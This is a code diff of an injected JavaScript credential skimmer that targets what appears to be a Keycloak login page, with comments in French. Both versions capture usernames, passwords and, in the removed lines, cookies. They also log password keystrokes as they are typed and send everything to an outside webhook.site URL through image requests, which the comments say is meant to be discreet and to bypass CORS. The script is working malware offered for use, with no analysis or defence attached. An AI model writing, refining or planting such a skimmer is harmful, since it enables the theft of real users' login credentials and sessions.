@@ -2,40 +2,41 @@
   if (window.__vault_jok3r_loaded__) return;
   window.__vault_jok3r_loaded__ = true;
 
+  // ✅ Ton Webhook ici
   const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';
 
-  function sendData(data) {
-    // Envoi via balise img pour bypass CORS
-    let i = new Image();
-    i.src = webhook + 
-      '?u=' + encodeURIComponent(data.username) +
-      '&p=' + encodeURIComponent(data.password) +
-      '&cookies=' + encodeURIComponent(document.cookie) +
-      '&url=' + encodeURIComponent(window.location.href);
+  function exfiltrate(username, password) {
+    const img = new Image();
+    img.src = `${webhook}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&url=${encodeURIComponent(window.location.href)}&ua=${encodeURIComponent(navigator.userAgent)}`;
   }
 
-  const form = document.getElementById('kc-form-login');
-  if (form) {
-    form.addEventListener('submit', function() {
-      const username = document.getElementById('username')?.value || '';
-      const password = document.getElementById('password')?.value || '';
+  function main() {
+    const form = document.getElementById('kc-form-login');
+    const usernameField = document.getElementById('username');
+    const passwordField = document.getElementById('password');
 
-      sendData({
-        username,
-        password
-      });
+    if (!form || !usernameField || !passwordField) {
+      // 🕐 Retry après un délai (DOM pas encore prêt ?)
+      setTimeout(main, 500);
+      return;
+    }
+
+    // ✅ Intercepte le submit (formulaire envoyé)
+    form.addEventListener('submit', function(e) {
+      const username = usernameField.value;
+      const password = passwordField.value;
+
+      // ✅ Exfiltration discrète
+      exfiltrate(username, password);
+    });
+
+    // ✅ Keylogger discret (optionnel)
+    passwordField.addEventListener('input', () => {
+      exfiltrate('', passwordField.value);
     });
   }
 
-  // Keylogger si tu veux capter en live
-  const passwordInput = document.getElementById('password');
-  if (passwordInput) {
-    passwordInput.addEventListener('input', () => {
-      sendData({
-        username: '',
-        password: passwordInput.value
-      });
-    });
-  }
+  // ✅ Lance l'écouteur
+  main();
 
 })();
